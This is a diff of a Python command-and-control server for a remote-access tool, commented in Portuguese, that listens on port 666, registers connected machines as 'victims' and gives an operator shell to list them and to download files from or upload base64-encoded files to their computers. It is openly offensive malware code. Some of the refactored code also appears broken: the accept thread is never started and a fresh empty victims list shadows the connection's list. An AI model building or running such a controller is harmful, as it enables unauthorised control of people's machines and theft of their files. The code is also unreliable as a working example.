@@ -4,50 +4,58 @@ import socket
 import threading
 
 
-class Connection:
+class Victim:
     """
-    Connection object
-    """
-    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    def __init__(self, host: str, port: int) -> connection:
-        # 1: Reutiliza o endereço no caso do server ser finalizado e reiniciado depois.
-        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 1
-        self.connection.bind((host, port))
-        # 2: Indica a quantidade de conexões simultâneas que serão gerenciadas.
-        self.connection.listen(1)  # 2
-        return self.connection
-
-
-class Victim:  # 3
-    """
-    Classe que gerencia as vítimas.
+    Classe para gerenciamento das vítimas.
     """
     def __init__(self, name: str, sock: socket) -> None:
         """
-        Construct the class.
+        Construct the victim.
         """
         self.name = name
         self.sock = sock
+            
 
-
-def accept_connection() -> None:  # 4
+class Connection:
     """
-    Função que aguarda a conexão da vítima.
+    Connection object.
     """
-    connection = Connection('0.0.0.0', 666)
+    connection = socket.socket(
+        socket.AF_INET,
+        socket.SOCK_STREAM,
+    )
     victims = []
 
-    while True:
-        sock, address = connection.accept()  # 5: Recebe novas conexões.
-        name = sock.recv(1024)  # 6: Aguarda 1024 bytes do ID da vítima.
-        victim = Victim(name, sock)  # 7: Instância a vítima.
-        victims.append(victim)  # 8: Adiciona na lista de vítimas ativas.
+    def __init__(self, host: str, port: int) -> connection:
+        """
+        Construct connection.
+
+        1: Reutilização do endereço. Para caso o servidor seja finalizado e reiniciado.
+        """
+        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 1
+        self.connection.bind((host, port))
+        self.connection.listen(1) # 2
+
+    def accept(self) -> None:
+        """
+        Accept the connection.
+
+        1: Recebe cada nova conexão.
+        2: Aguarda 1024 bytes do ID da vítima.
+        3: Cria um objeto para gerenciamento.
+        4: Adiciona na lista de vítimas.
+        """
+        while True:
+            sock, addr = self.connection.accept()  # 1
+            name = sock.recv(1024)  # 2
+            victim = Victim(name, sock)  # 3
+            self.victims.append(victim)  # 4
 
 
 if __name__ == '__main__':
-    threading.Thread(target=accept_connection).start()
-    victims = []  # 9: Lista de vítimas.
+    conn = Connection('0.0.0.0', 666)
+    victims = []
+    threading.Thread(target=conn.accept)
 
     while True:  # 10: Laço infinito para utilização do shell para gerenciar as vítimas.
         try:  # 11
@@ -57,7 +65,7 @@ if __name__ == '__main__':
                 pass
             elif command == 'victims':  # 13: Comando que mostra o ID e nome das vítimas.
                 print('ID\t|\tNAME')
-                
+
                 for idx, vct in enumerate(victims):  # 14: Adiciona, dinamicamente, um ID para as vítiams.
                     print(f'{idx}\t|\t{vct}')
 
@@ -98,7 +106,7 @@ if __name__ == '__main__':
 
                         with open(os.path.basename(_file), 'wb') as writer:  # 34: Cria o arquivo no diretório local.
                             writer.write(content)
-                        
+
                         print('Download complete!')
 
                 except IndexError:  # 35
@@ -111,14 +119,14 @@ if __name__ == '__main__':
 
                     with open(local_file, 'rb') as reader:
                         _file = reader.read()  # 39: Realiza a leitura do arquivo para enviar o mesmo.
-                
+
                     victims[victim].sock.send(f'Upload {_file}')  # 40: Envia para o PC da vítima o nome do arquivo.
                     print('Wait until the upload be finished ...')
                     # 41: Envia, em base64, para o PC da vítima o arquivo.
                     # O caracter '\n' serve para mostrar o final da transmissão.
                     victims[victim].sock.sendall(base64.b64encode(_file) + '\n')  # 41
                     # 42: Aguarda o recebimento de 26 bytes de resposta da máquina da vítima.
-                    response = victims[victim].sock.recv(26)  # 42 
+                    response = victims[victim].sock.recv(26)  # 42
 
                     if '\r' in response:  # 43: O caractere '\r' mostra que o socket da vítima levou timeout mas permanece ativo.
                         print(victims[victim].sock.recv(26))  # 44
@@ -192,4 +200,3 @@ if __name__ == '__main__':
                 del victim
             except NameError:  # 71
                 pass
- 
